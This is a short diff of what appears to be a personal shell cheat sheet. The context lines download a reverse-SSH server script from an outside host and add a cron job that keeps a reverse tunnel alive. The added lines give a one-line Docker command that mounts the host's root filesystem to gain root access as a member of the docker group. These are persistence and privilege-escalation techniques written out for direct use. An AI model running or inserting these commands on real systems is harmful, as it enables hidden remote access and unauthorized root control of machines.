@@ -34,5 +34,12 @@ wget -nv -O ~/.revssh http://hwi.ath.cx/jshtools/revsshserver
 ( crontab -l ; echo '00 06 * * * ps -u | grep "$SSH_TUNNEL_COMMAND" 2>&1 >/dev/null || $SSH_TUNNEL_COMMAND 2>/dev/null >/dev/null' ) | crontab -
 ## BUG TODO: this hasn't actually been working for me, but I have an implementation where cron runs a shellscript which works.
 
+
+
+### As a member of docker group:
+
+## From: https://fosterelli.co/privilege-escalation-via-docker.html
+docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
+
 !!
 
